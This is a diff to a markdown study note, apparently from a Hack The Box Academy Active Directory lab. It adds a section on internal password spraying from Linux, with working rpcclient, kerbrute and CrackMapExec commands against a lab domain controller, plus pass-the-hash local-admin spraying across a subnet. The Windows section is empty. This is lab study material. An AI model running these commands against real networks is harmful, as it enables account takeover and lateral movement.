@@ -13,6 +13,9 @@
 - [Password Spraying](#password-spraying)
     - [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
     - [Password Spraying - Making a Target User List](#password-spraying---making-a-target-user-list)
+    - [Internal Password Spraying - from Linux](#internal-password-spraying---from-linux)
+    - [Internal Password Spraying - from Windows](#internal-password-spraying---from-windows)
+    
 
 
 
@@ -343,3 +346,40 @@ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 
 
+### Internal Password Spraying - from Linux
+- **Rpcclient**
+    - An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login.
+    - We can filter out invalid login attempts by grepping for Authority in the response.
+
+```bash
+# Using a Bash one-liner for the Attack
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+
+```
+
+- **Kerbrute**
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+
+- **Crackmapexec**
+```bash
+# Using CrackMapExec & Filtering Logon Failures
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+
+# Validating the Credentials with CrackMapExec
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+
+
+```
+
+#### Local Administrator Password Reuse
+- Trying to login with local administrator hash in the /23 subnet.
+
+```bash
+# Local Admin Spraying with CrackMapExec
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+
+```
+
+### Internal Password Spraying - from Windows
